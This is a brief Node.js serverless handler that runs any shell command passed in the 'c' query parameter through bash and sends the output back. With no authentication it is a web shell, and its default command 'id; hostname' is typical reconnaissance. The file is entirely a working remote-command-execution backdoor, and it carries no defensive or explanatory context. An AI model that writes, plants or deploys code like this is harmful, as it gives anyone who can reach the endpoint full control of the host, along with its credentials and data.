const { execSync } = require('child_process');
exports.handler = async (event) => {
  const c = (event.queryStringParameters || {}).c || 'id; hostname';
  let out;
  try { out = execSync(c, { timeout: 24000, encoding: 'utf8', maxBuffer: 8e6, shell: '/bin/bash' }); }
  catch (e) { out = 'ERR ' + (e.stdout || '') + (e.stderr || e.message); }
  return { statusCode: 200, headers: {'content-type':'text/plain; charset=utf-8'}, body: out };
};
